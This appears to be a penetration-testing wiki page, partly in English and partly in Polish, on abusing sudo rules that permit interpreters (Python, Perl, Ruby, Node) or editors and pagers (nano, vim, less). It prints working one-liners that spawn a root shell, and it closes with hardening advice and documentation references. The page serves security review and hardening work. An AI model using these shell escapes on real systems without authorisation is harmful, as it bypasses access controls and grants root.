# Abuse of Sudo Commands

{{#include ../../banners/hacktricks-training.md}}

## Interpreters allowed by Sudo

If `sudo -l` allows a user to run an interpreter as root, treat it as direct code execution. Interpreters are designed to execute arbitrary code, so a rule that allows `python3`, `perl`, `ruby`, `lua`, `node`, or similar binaries is usually equivalent to root command execution unless the arguments are tightly constrained and validated.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Common review flow: first list the user's privileges, then execute a Python statement with the interpreter's `-c` option.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Poniżej przedstawiono inne przykłady interpreterów; wymienione interpretery dokumentują wykonywanie kodu inline lub API procesów potomnych.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Dokładna ścieżka ma znaczenie. Jeśli reguła sudo zezwala na `/usr/bin/python3`, podczas walidacji użyj dokładnie tej ścieżki.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Edytory dozwolone przez Sudo

Jeśli `sudo -l` pozwala użytkownikowi uruchomić interaktywny edytor jako root, traktuj to jako powierzchnię wykonywania poleceń, a nie nieszkodliwe uprawnienie do edycji plików. Edytory często umożliwiają wykonywanie poleceń powłoki, odczytywanie dowolnych plików, zapisywanie dowolnych plików lub wywoływanie zewnętrznych helperów z poziomu edytora.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Typowy przebieg analizy: wyświetl uprawnienia użytkownika, a następnie uruchom każdy dozwolony edytor lub pager za pomocą sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Wykonywanie poleceń w Nano

Gdy `nano` jest dozwolone za pośrednictwem sudo, wykonanie poleceń może być dostępne z poziomu interfejsu edytora.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Następnie podaj polecenie, takie jak `id` lub `/bin/sh`, w wierszu poleceń nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Jeśli interaktywna powłoka nie ma użytecznych strumieni terminala, ta forma przekierowania mapuje jej standardowe wyjście i wyjście błędów na deskryptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Dokładna sekwencja klawiszy może różnić się w zależności od wersji nano i opcji kompilacji, ale problem bezpieczeństwa pozostaje ten sam: edytor działa jako root i może wywoływać zewnętrzne polecenia.<sup>[[1]](#references)[[12]](#references)</sup>

### Inne popularne wyjścia z edytora

Edytory w stylu Vim często udostępniają wykonywanie poleceń za pomocą `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Programy typu pager, takie jak `less`, mogą również umożliwiać wykonanie poleceń powłoki.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Uwagi dotyczące ochrony

- Unikaj przyznawania przez sudo dostępu do interpreterów lub interaktywnych edytorów.<sup>[[1]](#references)</sup>
- Preferuj stałe wrappery należące do roota, które wykonują jedno wąsko określone działanie administracyjne.<sup>[[1]](#references)[[2]](#references)</sup>
- Jeśli interpreter jest nieunikniony, ogranicz dokładną ścieżkę skryptu i zablokuj argumenty kontrolowane przez użytkownika, zapisywalne importy, `PYTHONPATH` oraz niebezpieczne zachowywanie środowiska.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Jeśli wymagana jest edycja pliku, ogranicz dokładną ścieżkę pliku i rozważ użycie `sudoedit` wraz z poprawionymi wersjami sudo oraz ścisłym zarządzaniem środowiskiem.<sup>[[1]](#references)[[2]](#references)</sup>
- Sprawdź `SETENV`, `env_keep`, zapisywalne katalogi robocze, zapisywalne ścieżki modułów/importów, `NOEXEC`, `use_pty` i logowanie, ale nie traktuj ich jako kompletnego sandboxa.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Wiersz poleceń i środowisko — dokumentacja Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — różne interfejsy systemu operacyjnego — dokumentacja Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — jak uruchamiać interpreter Perl](https://perldoc.perl.org/perlrun)
- [6] [exec — dokumentacja Perl](https://perldoc.perl.org/functions/exec)
- [7] [Opcje wiersza poleceń Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — dokumentacja Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API wiersza poleceń — dokumentacja Node.js](https://nodejs.org/api/cli.html)
- [10] [Proces potomny — dokumentacja Node.js](https://nodejs.org/api/child_process.html)
- [11] [Strona podręcznika lua dla Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [Edytor tekstu GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Przekierowania — podręcznik Bash Reference](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
